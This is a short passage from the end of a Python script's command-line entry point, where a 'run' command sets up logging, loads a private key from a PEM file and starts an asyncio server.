    if args.cmd == "run":
        LISTEN_HOST = args.host; LISTEN_PORT = args.port
        logging.basicConfig(
            level=logging.DEBUG if args.verbose else logging.INFO,
            format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S",
        )
        pp = KEY_DIR / "private.pem"
        if not pp.exists():
            print(f"Run: python {sys.argv[0]} generate-keys"); sys.exit(1)
        pk = load_pem_private_key(pp.read_bytes(), password=None)
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(run_server(pk)); return
    p.print_help()


if __name__ == "__main__":
    main()
